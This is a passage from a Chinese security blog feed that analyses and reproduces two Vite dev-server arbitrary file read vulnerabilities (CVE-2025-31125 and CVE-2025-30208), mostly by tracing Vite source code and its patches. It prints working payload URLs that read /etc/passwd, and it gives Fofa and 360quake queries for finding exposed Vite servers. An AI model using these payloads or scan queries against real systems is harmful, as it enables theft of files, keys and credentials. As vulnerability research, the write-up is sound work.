function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">rtn</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">if</span> (publicFile) &#123;</span><br><span class="line">    <span class="comment">// in public dir during dev, keep the url as-is</span></span><br><span class="line">    rtn = id</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id.<span class="title function_">startsWith</span>(<span class="title function_">withTrailingSlash</span>(config.<span class="property">root</span>))) &#123;</span><br><span class="line">    <span class="comment">// in project root, infer short public path</span></span><br><span class="line">    rtn = <span class="string">&#x27;/&#x27;</span> + path.<span class="property">posix</span>.<span class="title function_">relative</span>(config.<span class="property">root</span>, id)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// outside of project root, use absolute fs path</span></span><br><span class="line">    <span class="comment">// (this is special handled by the serve static middleware</span></span><br><span class="line">    rtn = path.<span class="property">posix</span>.<span class="title function_">join</span>(<span class="variable constant_">FS_PREFIX</span>, id)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipBase) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtn</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> base = <span class="title function_">joinUrlSegments</span>(config.<span class="property">server</span>.<span class="property">origin</span> ?? <span class="string">&#x27;&#x27;</span>, config.<span class="property">decodedBase</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">joinUrlSegments</span>(base, <span class="title function_">removeLeadingSlash</span>(rtn))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里inlineRE.test(id)是false的。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = publicFile || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">await</span> fsp.<span class="title function_">readFile</span>(file)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">assetToDataURL</span>(environment, file, content)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是svgExtRE.test(id)为true。</p><p>然后就是清洗Url，file为<code>/@fs/etc/passwd</code>，可以读取任意文件。</p><p>但是注意，这里多了一个点！<code>shouldInline</code>必须为true才行！</p><p>这种利用方式还有个限制就是只能读取文件小于 <code>build.assetsInlinelimit </code>(默认为 4kB) 的文件</p><p>这里我们跟进一下<code>shouldInline</code>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shouldInline</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">Environment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">file</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">id</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">content</span>: <span class="title class_">Buffer</span>,</span></span><br><span class="line"><span class="params">  <span class="comment">/** Should be passed only in build */</span></span></span><br><span class="line"><span class="params">  <span class="attr">buildPluginContext</span>: <span class="title class_">PluginContext</span> | <span class="literal">undefined</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">forceInline</span>: <span class="built_in">boolean</span> | <span class="literal">undefined</span>,</span></span><br><span class="line"><span class="params"></span>): <span class="built_in">boolean</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (noInlineRE.<span class="title function_">test</span>(id)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">if</span> (inlineRE.<span class="title function_">test</span>(id)) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment">// Do build only checks if passed the plugin context during build</span></span><br><span class="line">  <span class="keyword">if</span> (buildPluginContext) &#123;</span><br><span class="line">    <span class="keyword">if</span> (environment.<span class="property">config</span>.<span class="property">build</span>.<span class="property">lib</span>) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> (buildPluginContext.<span class="title function_">getModuleInfo</span>(id)?.<span class="property">isEntry</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (forceInline !== <span class="literal">undefined</span>) <span class="keyword">return</span> forceInline</span><br><span class="line">  <span class="keyword">if</span> (file.<span class="title function_">endsWith</span>(<span class="string">&#x27;.html&#x27;</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">// Don&#x27;t inline SVG with fragments, as they are meant to be reused</span></span><br><span class="line">  <span class="keyword">if</span> (file.<span class="title function_">endsWith</span>(<span class="string">&#x27;.svg&#x27;</span>) &amp;&amp; id.<span class="title function_">includes</span>(<span class="string">&#x27;#&#x27;</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">limit</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="keyword">const</span> &#123; assetsInlineLimit &#125; = environment.<span class="property">config</span>.<span class="property">build</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> assetsInlineLimit === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> userShouldInline = <span class="title function_">assetsInlineLimit</span>(file, content)</span><br><span class="line">    <span class="keyword">if</span> (userShouldInline != <span class="literal">null</span>) <span class="keyword">return</span> userShouldInline</span><br><span class="line">    limit = <span class="variable constant_">DEFAULT_ASSETS_INLINE_LIMIT</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    limit = <span class="title class_">Number</span>(assetsInlineLimit)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> content.<span class="property">length</span> &lt; limit &amp;&amp; !<span class="title function_">isGitLfsPlaceholder</span>(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/image-20250410143404225.png" class="" title="图片引用方法一"><p>接下来我们看看vite6.2.5是如何进行防御的：</p><p><code>/@fs/etc/passwd?import&amp;?meteorkai.svg?.wasm?init</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlRE = <span class="regexp">/[?&amp;]url\b/</span></span><br><span class="line"><span class="keyword">const</span> rawRE = <span class="regexp">/[?&amp;]raw\b/</span></span><br><span class="line"><span class="keyword">const</span> inlineRE = <span class="regexp">/[?&amp;]inline\b/</span></span><br><span class="line"><span class="keyword">const</span> svgRE = <span class="regexp">/\.svg\b/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deniedServingAccessForTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">server</span>: <span class="title class_">ViteDevServer</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">res</span>: <span class="title class_">ServerResponse</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">next</span>: <span class="title class_">Connect</span>.<span class="title class_">NextFunction</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    (rawRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      urlRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      inlineRE.<span class="title function_">test</span>(url) ||</span><br><span class="line">      svgRE.<span class="title function_">test</span>(url)) &amp;&amp;</span><br><span class="line">    !<span class="title function_">ensureServingAccess</span>(url, server, res, next)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>svgRE.test(url))为true了。。。直接防下！</p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-30208)</title>
      <link href="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/"/>
      <url>/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/</url>
      
        <content type="html"><![CDATA[<h2 id="初步了解"><a href="#初步了解" class="headerlink" title="初步了解"></a>初步了解</h2><p>Vite 是一款现代化的前端开发构建工具，它提供了快速的开发服务器和高效的构建能力，广泛应用于 Vue.js 项目的开发过程中。<br>由于 Vite 开发服务器在处理特定 URL 请求时，没有对请求的路径进行严格的安全检查和限制，导致攻击者可以绕过保护机制，非法访问项目根目录外的敏感文件。攻击者只需在浏览器输入一个 URL，就可能会造成源码、SSH密钥、数据库账号、用户数据等目标机器上的任意文件信息泄露。</p><p>影响版本：</p><blockquote><p>6.2.0 &lt;&#x3D; Vite &lt;&#x3D; 6.2.2</p><p>6.1.0 &lt;&#x3D; Vite &lt;&#x3D; 6.1.1</p><p>6.0.0 &lt;&#x3D; Vite &lt;&#x3D; 6.0.11</p><p>5.0.0 &lt;&#x3D; Vite &lt;&#x3D; 5.4.14</p><p>Vite &lt;&#x3D; 4.5.9</p></blockquote><p>其实2021年4月就有人第一次给Vite提交了<code>@fs</code>导致的文件读取漏洞（CNVD-2022-4461），当时的payload就是：<code>/@fs/etc/passwd</code>。</p><p>后来官方修复了这个漏洞，直到最近补丁被绕过。使用这个payload来绕过：<code>/@fs/etc/passwd?raw??</code></p><p>Fofa搜索语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;/@vite/client&quot;</span><br></pre></td></tr></table></figure><p>亲测，几乎所有网站都有洞！！！</p><p>360quake搜索语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body:&quot;/@vite/client&quot;</span><br></pre></td></tr></table></figure><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里的环境我们直接用p神的vulhub漏洞环境。</p><p><a href="https://github.com/vulhub/vulhub/tree/master/vite">https://github.com/vulhub/vulhub/tree/master/vite</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>payload：以下两个payload都是可以的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.128:5173/@fs/etc/passwd?raw??          只能读无后缀文件</span><br><span class="line">http://192.168.79.128:5173/@fs/etc/passwd?import&amp;raw??   用这个比较好，可以读有后缀的文件</span><br></pre></td></tr></table></figure><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331164222066.png" class="" title="This is an example image"><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331164108194.png" class="" title="This is an example image"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>@fs</code>拒绝访问 Vite 服务允许列表之外的文件。将<code>?raw??</code>或<code>?import&amp;raw??</code>添加到 URL 可绕过此限制并返回文件内容（如果存在）。之所以存在这种绕过，是因为<code>?</code>在多个地方删除了尾随分隔符（例如），但在查询字符串正则表达式中没有考虑到这一点。</p><p>主要修补点：<a href="https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cL43-R188</a></p><p>packages&#x2F;vite&#x2F;src&#x2F;node&#x2F;server&#x2F;middlewares&#x2F;transform.ts</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331185454174.png" class="" title="This is an example image"><p>官方的commit其实就是加了个正则，同时在之后进行了替换</p><p>使用正则<code>/[?&amp;]+$/</code>替换成空值，将url地址最后的连续的&amp;或者?替换成空。</p><p>这里我们先看看6.2.2版本（漏洞版本）的rawRE和urlRE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export const urlRE = /(\?|&amp;)url(?:&amp;|$)/</span><br><span class="line">export const rawRE = /(\?|&amp;)raw(?:&amp;|$)/</span><br></pre></td></tr></table></figure><p>通过正则匹配进行判断是否属于raw或者url类型的。满足任意一个就会使用ensureServingAccess函数进行鉴权。比如rawRe的正则为：<code>export const rawRE = /(\?|&amp;)raw(?:&amp;|$)/</code></p><p>匹配要求raw参数结束或者raw&amp;。结合官方的修复方案这里使用的是?raw?进行绕过，但是在这个函数开头有一部分代码</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      url = <span class="built_in">decodeURI</span>(<span class="title function_">removeTimestampQuery</span>(req.<span class="property">url</span>!)).<span class="title function_">replace</span>(</span><br><span class="line">        <span class="variable constant_">NULL_BYTE_PLACEHOLDER</span>,</span><br><span class="line">        <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">      )</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>(e)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们跟进一下removeTimestampQuery函数</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span>    <span class="comment">//匹配最后一位?或者&amp;的字符，并替换为空</span></span><br><span class="line"><span class="keyword">const</span> timestampRE = <span class="regexp">/\bt=\d&#123;13&#125;&amp;?\b/</span>   <span class="comment">//匹配13位的数字，并替换为空const</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeTimestampQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(timestampRE, <span class="string">&#x27;&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这会删除最后一位的<code>?</code>，因此payload就是<code>?raw??</code></p><p>很明显，这里只替换了一次为空?或者&amp;，故url由</p><p>&#x2F;@fs&#x2F;tmp&#x2F;test.txt?import&amp;raw?? 替换成了</p><p>&#x2F;@fs&#x2F;tmp&#x2F;test.txt?import&amp;raw?</p><p>然后我们跟着代码往下走，会走到如下代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">       (rawRE.<span class="title function_">test</span>(url) || urlRE.<span class="title function_">test</span>(url)) &amp;&amp;</span><br><span class="line">       !<span class="title function_">ensureServingAccess</span>(url, server, res, next)</span><br><span class="line">     ) &#123;</span><br><span class="line">       <span class="keyword">return</span></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>此处需要rawRE.test(url)和urlRE.test(url)都会false才不会进入ensureServingAccess进行鉴权。</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331194046444.png" class="" title="This is an example image"><p>然后就是通过import参数进入if条件判断。并调用removeImportQuery清除import参数的函数。</p><p>然后我们再两者都为false的前提下往下走：</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331194705098.png" class="" title="This is an example image"><p>接 下 来 会 依 次 判 断 isJSRequest ， isImportRequest ， isCSSRequest ， isHTMLProxy。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> knownJsSrcRE =</span><br><span class="line">  <span class="regexp">/\.(?:[jt]sx?|m[jt]s|vue|marko|svelte|astro|imba|mdx)(?:$|\?)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isJSRequest = (<span class="attr">url</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> &#123;</span><br><span class="line">  url = <span class="title function_">cleanUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (knownJsSrcRE.<span class="title function_">test</span>(url)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!path.<span class="title function_">extname</span>(url) &amp;&amp; url[url.<span class="property">length</span> - <span class="number">1</span>] !== <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isImportRequest = (<span class="attr">url</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> importQueryRE.<span class="title function_">test</span>(url)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="variable constant_">CSS_LANGS_RE</span> =</span><br><span class="line">  <span class="regexp">/\.(css|less|sass|scss|styl|stylus|pcss|postcss|sss)(?:$|\?)/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isCSSRequest = (<span class="attr">request</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span></span><br><span class="line">  <span class="variable constant_">CSS_LANGS_RE</span>.<span class="title function_">test</span>(request)</span><br></pre></td></tr></table></figure><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isHtmlProxyRE = <span class="regexp">/\?html-proxy\b/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> isHTMLProxy = (<span class="attr">id</span>: <span class="built_in">string</span>): <span class="function"><span class="params">boolean</span> =&gt;</span> isHtmlProxyRE.<span class="title function_">test</span>(id)</span><br></pre></td></tr></table></figure><p>这里拿<code>/@fs/etc/passwd?import&amp;raw??</code>来说，经过了一个removeTimestampQuery后会变成<code>/@fs/etc/passwd?import&amp;raw?</code>。</p><p>那就会在 isImportRequest处断言为真</p><blockquote><p>但是此时我有一个疑问？？</p><p>为什么**?raw??**这个payload也是可以的？？上面的正则好像都匹配不上啊？</p><p>这里我们看下js的判断函数</p><p>if (!path.extname(url) &amp;&amp; url[url.length - 1] !&#x3D;&#x3D; ‘&#x2F;‘) {<br> return true<br>}</p><p>如果没有文件拓展名且不以斜杠结尾，那么直接返回true</p><p>但是有限制，只能读取无后缀文件</p></blockquote><p>经过上述这个if判断后，会进入if语句。那么遇到的就是removeImportQuery函数</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"><span class="keyword">const</span> trailingSeparatorRE = <span class="regexp">/[?&amp;]$/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在removeImportQuery函数中在清除掉import参数后，还将结尾的多余的?或者&amp;给清除掉了。</p><p>随后进入到transformRequest中，此时<code>/@fs/etc/passwd?raw</code></p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331202800905.png" class="" title="This is an example image"><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cacheKey = <span class="string">`<span class="subst">$&#123;options.html ? <span class="string">&#x27;html:&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span><span class="subst">$&#123;url&#125;</span>`</span></span><br><span class="line"><span class="comment">// 检查是否已经有相同的请求在进行中</span></span><br><span class="line"><span class="keyword">const</span> pending = environment.<span class="property">_pendingRequests</span>.<span class="title function_">get</span>(cacheKey)</span><br><span class="line"><span class="comment">// 直接复用已有的请求，避免重复发送</span></span><br><span class="line"><span class="keyword">if</span> (pending) &#123;</span><br></pre></td></tr></table></figure><p>上述代码一般用于请求去重。</p><p>pending为空，然后就进入了doTransform函数。</p><img src="/2025/03/31/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-30208/image-20250331204313895.png" class="" title="This is an example image"><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">doTransform</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="attr">environment</span>: <span class="title class_">DevEnvironment</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">url</span>: <span class="built_in">string</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">options</span>: <span class="title class_">TransformOptions</span>,</span></span><br><span class="line"><span class="params">  <span class="attr">timestamp</span>: <span class="built_in">number</span>,</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  url = <span class="title function_">removeTimestampQuery</span>(url)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> &#123; pluginContainer &#125; = environment</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">module</span>) &#123;</span><br><span class="line">    <span class="comment">// try use cache from url</span></span><br><span class="line">    <span class="keyword">const</span> cached = <span class="keyword">await</span> <span class="title function_">getCachedTransformResult</span>(</span><br><span class="line">      environment,</span><br><span class="line">      url,</span><br><span class="line">      <span class="variable language_">module</span>,</span><br><span class="line">      timestamp,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> (cached) <span class="keyword">return</span> cached</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> resolved = <span class="variable language_">module</span></span><br><span class="line">    ? <span class="literal">undefined</span></span><br><span class="line">    : ((<span class="keyword">await</span> pluginContainer.<span class="title function_">resolveId</span>(url, <span class="literal">undefined</span>)) ?? <span class="literal">undefined</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// resolve</span></span><br><span class="line">  <span class="keyword">const</span> id = <span class="variable language_">module</span>?.<span class="property">id</span> ?? resolved?.<span class="property">id</span> 